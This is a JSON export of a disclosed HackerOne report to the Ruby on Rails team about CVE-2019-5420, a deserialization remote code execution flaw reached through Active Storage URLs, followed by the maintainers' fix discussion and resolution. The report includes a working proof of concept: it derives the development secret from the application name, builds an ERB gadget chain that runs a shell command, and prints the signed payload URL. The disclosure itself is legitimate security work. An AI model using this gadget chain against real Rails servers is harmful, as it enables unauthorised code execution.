{"id":473888,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzM4ODg=","url":"https://hackerone.com/reports/473888","title":"RCE which may occur due to `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` (especially Active storage)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-01-02T03:20:45.831Z","submitted_at":"2019-01-02T03:20:45.831Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ooooooo_q","url":"/ooooooo_q","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22,"url":"https://hackerone.com/rails","handle":"rails","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Ruby on Rails","twitter_handle":null,"website":"http://rubyonrails.org/security","about":"Web development that doesn't hurt."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-5420"],"singular_disclosure_disabled":false,"disclosed_at":"2019-03-13T19:41:52.199Z","bug_reporter_agreed_on_going_public_at":"2019-03-13T19:40:27.183Z","team_member_agreed_on_going_public_at":"2019-03-13T19:41:52.092Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Since `ActiveSupport::MessageVerifier` and `ActiveSupport::MessageEncryptor` use Marshal as the default serializer, I confirmed that RCE is possible by object injection.\n\n\n```ruby\n# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_verifier.rb#L110\n    def initialize(secret, options = {})\n      raise ArgumentError, \"Secret should not be nil.\" unless secret\n      @secret = secret\n      @digest = options[:digest] || \"SHA1\"\n      @serializer = options[:serializer] || Marshal\n    end\n```\n\n```ruby\n# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_encryptor.rb#L145\ndef initialize(secret, *signature_key_or_options)\n  options = signature_key_or_options.extract_options!\n  sign_secret = signature_key_or_options.first\n  @secret = secret\n  @sign_secret = sign_secret\n  @cipher = options[:cipher] || self.class.default_cipher\n  @digest = options[:digest] || \"SHA1\" unless aead_mode?\n  @verifier = resolve_verifier\n  @serializer = options[:serializer] || Marshal\nend\n```\n\nEspecially in Rails 5.2 and later, `ActiveSupport::MessageVerifier` is used to validate the URL used in Active Storage, and attacks are possible.\n\n\n```ruby\n# https://github.com/rails/rails/blob/v5.2.2/activestorage/lib/active_storage/engine.rb#L81\ninitializer \"active_storage.verifier\" do\n  config.after_initialize do |app|\n    ActiveStorage.verifier = app.message_verifier(\"ActiveStorage\")\n  end\nend\n```\n\n```ruby\n# https://github.com/rails/rails/blob/v5.2.2/activestorage/app/controllers/active_storage/disk_controller.rb#L38\ndef decode_verified_key\n  ActiveStorage.verifier.verified(params[:encoded_key], purpose: :blob_key)\nend\n```\n\nIt is also used in `ActiveStorage::Blob.find_signed`.\nAlso, these URLs can be accessed without using Active Storage.\n\n### PoC\n\n#### 1. Prepare server\n\n```\n$ ruby -v\nruby 2.6.0p0 (2018-12-25 revision 66547) [x86_64-darwin16]\n\n$ rails -v\nRails 5.2.2\n\n$ rails new verifier_rce\n$ cd verifier_rce/\n$ bundle install\n```\n\n```\n# Active Storage is not installed, but routes is usable\n$ bin/rails routes\nPrefix Verb URI Pattern                                                                              Controller#Action\nrails_service_blob GET  /rails/active_storage/blobs/:signed_id/*filename(.:format)                               active_storage/blobs#show\nrails_blob_representation GET  /rails/active_storage/representations/:signed_blob_id/:variation_key/*filename(.:format) active_storage/representations#show\nrails_disk_service GET  /rails/active_storage/disk/:encoded_key/*filename(.:format)                              active_storage/disk#show\nupdate_rails_disk_service PUT  /rails/active_storage/disk/:encoded_token(.:format)                                      active_storage/disk#update\nrails_direct_uploads POST /rails/active_storage/direct_uploads(.:format)                                           active_storage/direct_uploads#create\n```\n\n#### 2. Prepare payload\n\n```ruby\n$ ls /tmp/rce\nls: /tmp/rce: No such file or directory\n\n$ bundle exec rails console\nRunning via Spring preloader in process 66998\nLoading development environment (Rails 5.2.2)\n\nirb(main):001:0\u003e # emulate verifier\n=\u003e nil\nirb(main):002:0\u003e app_class_name = VerifierRce::Application.name\n=\u003e \"VerifierRce::Application\"\nirb(main):003:0\u003e secret_key_base = Digest::MD5.hexdigest(VerifierRce::Application.name)\n=\u003e \"7e485df67863e85e584b3feecb22276d\"\nirb(main):004:0\u003e key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))\n=\u003e #\u003cActiveSupport::CachingKeyGenerator:0x00007ff55ac60d48 @key_generator=#\u003cActiveSupport::KeyGenerator:0x00007ff55ac60d98 @secret=\"7e485df67863e85e584b3feecb22276d\", @iterations=1000\u003e, @cache_keys=#\u003cConcurrent::Map:0x00007ff55ac60cf8 entries=0 default_proc=nil\u003e\u003e\nirb(main):005:0\u003e secret = key_generator.generate_key(\"ActiveStorage\")\n=\u003e \"\\xB09\\x11u/6#\\x04\\xE6\\x15\\x9C_\\xBB\\xE8\\x94\\xD0pn\u003c\\xFD\\x15\\x85\\x95\\x8BR\\x82\\x13\\xCA\\xC3\\xDE\\xAEB\\x98\\xDA\\v\\xD6+jI\\xE6\\x80\\x9E\\xC8$e\\xE8(\\xD5\\x98\\x82\\x1FVy1\\x9D\u003eR\\xAE\\x9D\\xAE\\x88\\xF1\\xBA,\"\nirb(main):006:0\u003e verifier = ActiveSupport::MessageVerifier.new(secret)\n=\u003e #\u003cActiveSupport::MessageVerifier:0x00007ff558aaee20 @secret=\"\\xB09\\x11u/6#\\x04\\xE6\\x15\\x9C_\\xBB\\xE8\\x94\\xD0pn\u003c\\xFD\\x15\\x85\\x95\\x8BR\\x82\\x13\\xCA\\xC3\\xDE\\xAEB\\x98\\xDA\\v\\xD6+jI\\xE6\\x80\\x9E\\xC8$e\\xE8(\\xD5\\x98\\x82\\x1FVy1\\x9D\u003eR\\xAE\\x9D\\xAE\\x88\\xF1\\xBA,\", @digest=\"SHA1\", @serializer=Marshal, @options={}, @rotations=[]\u003e\nirb(main):007:0\u003e\n\n\nirb(main):008:0\u003e # https://medium.com/@u0x/marshall-unserialization-exploit-for-ruby-on-rails-5-1-4-979475cfdba0\n=\u003e nil\nirb(main):009:0\u003e code = '`touch /tmp/rce`'\n=\u003e \"`touch /tmp/rce`\"\nirb(main):010:0\u003e erb = ERB.allocate\n=\u003e #\u003cERB:0x00007ff55acabdc0\u003e\nirb(main):011:0\u003e erb.instance_variable_set :@src, code\n=\u003e \"`touch /tmp/rce`\"\nirb(main):012:0\u003e erb.instance_variable_set :@filename, \"1\"\n=\u003e \"1\"\nirb(main):013:0\u003e erb.instance_variable_set :@lineno, 1\n=\u003e 1\nirb(main):014:0\u003e dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result\n=\u003e \"\"\nirb(main):015:0\u003e\n\nirb(main):016:0\u003e verifier.generate(dump_target, purpose: :blob_key)\n=\u003e \"eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d\"\n```\n\n```\n# Confirm that the file was generated due to the side effect of creating payload\n$ ls /tmp/rce\n/tmp/rce\n\n# Erase the file as it disturbs the operation check\n$ rm /tmp/rce\n$ ls /tmp/rce\nls: /tmp/rce: No such file or directory\n```\n\n#### 3. Attack\n\nStart server.\n\n```\n$ bin/rails s\n```\n\nOpen URL in browser.\n(`GET  /rails/active_storage/disk/:encoded_key/*filename`, use payload for `:encoded_key`)\n\n```\nhttp://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d/test\n```\n\nConfirm that the file was created.\n\n```\n$ ls /tmp/rce\n/tmp/rce\n```\n\n## Impact\n\nIf the server is running in development mode with version 5.2 or later, if the attacker can know application name, `secret_key_base` can be obtained, so RCE can be easily done by accessing the URL.\nIn production mode, an attacker needs to know `secret_key_base`.\n\nFor versions less than 5.2, attacks are possible only if the user is able to input places using `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` and the attacker knows `secret_key_base`.\n\n### proposed measures\n\n- Use `JSON.load` or `Yaml.safe_load` without using Marshal\n- Disable access to URL if Active Storage is not used","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-04-12T19:40:27.278Z","allow_singular_disclosure_after":-78866598.04869634,"singular_disclosure_allowed":true,"vote_count":40,"voters":["kapytein","secator","bl4de","nikitastupin","leetboi","romesful","ali","mysterican","apapedulimu","khizer47","and 30 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":160,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/rails/rails","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3913307,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, it was `JSON.parse` instead of `JSON.load`.","automated_response":false,"created_at":"2019-01-02T03:59:43.260Z","updated_at":"2019-01-02T03:59:43.260Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3938187,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There are few cases where an attacker can directly access servers in development mode.\nHowever, because it is a GET access, it can be attacked using access to images, for example.\nAn attacker could induce the developer to gain access to the trapping site and include the payload of the attack in the URL of the image.\n","automated_response":false,"created_at":"2019-01-07T19:41:49.917Z","updated_at":"2019-01-07T19:41:49.917Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3939191,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This vulnerability seems to affect https://hackerone.com.\n\nResponse when accessing https://hackerone.com/rails/active_storage/disk/test/test is empty.\nBecause normal 404 pages are displayed as https://hackerone.com/404, it seems that the URL of active storage is used.","automated_response":false,"created_at":"2019-01-07T22:55:45.348Z","updated_at":"2019-01-07T22:55:45.348Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3982873,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@rails Any updates?","automated_response":false,"created_at":"2019-01-15T21:57:29.288Z","updated_at":"2019-01-15T21:57:29.288Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3982884,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ooooooo_q Hi, sorry for the late response.  I'm taking a look :)","automated_response":false,"created_at":"2019-01-15T21:59:29.660Z","updated_at":"2019-01-15T21:59:29.660Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3983125,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nWe've been discussing how to fix this.  I thought JSON or YAML would work, but apparently [Rails supports serializing arbitrary objects](https://github.com/rails/rails/blob/a08827a90b5a9be79379019cf5b242bd7236d2e3/activesupport/test/message_verifier_test.rb#L22).  Switching to JSON breaks tests.  `YAML.safe_load` supports more types than JSON, so maybe we could use that.  Another thought I had is we could make the `secret_key_base` not so easy to guess.\n\nI don't like that Marshal is the default.  I think we should switch the default to JSON or YAML, but I'm certain it will break apps.  A less predictable secret_key_base might be the right fix here.  What do you think?","automated_response":false,"created_at":"2019-01-15T23:17:24.063Z","updated_at":"2019-01-15T23:17:24.063Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3986707,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tenderlove \nHi,\n\nI imagined that for 5.2.x the following changes would be made.\n(For other versions, I imagined breaking change when major version was upgraded.)\n\n\n```ruby\n  class StorageSerializer\n    def self.load(value)\n      v = JSON.parse(value)\n      v.is_a?(Hash) ? v.symbolize_keys : v\n    end\n\n    def self.dump(value)\n      JSON.dump(value)\n    end\n  end\n\n  class Application \u003c Rails::Application\n\n   ...\n\n    def message_verifier(verifier_name)\n      serializer = verifier_name == \"ActiveStorage\" ? StorageSerializer : Marshal;\n      @message_verifiers[verifier_name] ||= begin\n        secret = key_generator.generate_key(verifier_name.to_s)\n        ActiveSupport::MessageVerifier.new(secret, serializer: serializer)\n      end\n    end\n  end\n```\n\nAlso, by avoiding inferring secret_key_base as you say, the problem is alleviated. (Depending on what secret_key_base can guess, there may be other unexpected problems occurring.)\n\nIf there is no other effect, I think that it is better to do both.","automated_response":false,"created_at":"2019-01-16T12:42:46.703Z","updated_at":"2019-01-16T12:42:46.703Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4104278,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2019-02-06T17:44:45.766Z","updated_at":"2019-02-06T17:44:45.766Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4318235,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","automated_response":false,"created_at":"2019-03-13T17:51:58.839Z","updated_at":"2019-03-13T17:51:58.839Z","cve_ids":["CVE-2019-5420"],"actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4318241,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We've fixed this and shipped it.  Thank you!","automated_response":false,"created_at":"2019-03-13T17:52:55.792Z","updated_at":"2019-03-13T17:52:55.792Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ooooooo_q","url":"/ooooooo_q"},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4318248,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-03-13T17:53:43.420Z","updated_at":"2019-03-13T17:53:43.420Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Ruby on Rails"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"rails","collaborator":{"username":"ooooooo_q","url":"/ooooooo_q"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4318835,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-03-13T19:40:27.220Z","updated_at":"2019-03-13T19:40:27.220Z","first_to_agree":true,"actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4318839,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-03-13T19:41:52.134Z","updated_at":"2019-03-13T19:41:52.134Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4318840,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-03-13T19:41:52.231Z","updated_at":"2019-03-13T19:41:52.231Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4401874,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tenderlove  @rails \n\nhello,\n\nIn 5.2.x or later, it seems that it is not known to developers that it is possible to attack with the URL for active storage.\nSome people think it's a problem with the cookie store.\n\nHowever, the combination with CVE-2019-5418 is widespread among bug hunters.\n\nThe default time limit for active storage url is 5 minutes, and I thought that it would be better to issue a fix because the downtime usually falls within 5 minutes even if the serializer is changed by a patch.\nhttps://github.com/rails/rails/blob/5-2-stable/activestorage/lib/active_storage/service.rb#L44\n","automated_response":false,"created_at":"2019-03-27T12:14:25.969Z","updated_at":"2019-03-27T12:14:25.969Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4554123,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@rails \nAre there plans to change the serializer in Active storage?","automated_response":false,"created_at":"2019-04-13T14:23:16.192Z","updated_at":"2019-04-13T14:23:16.192Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}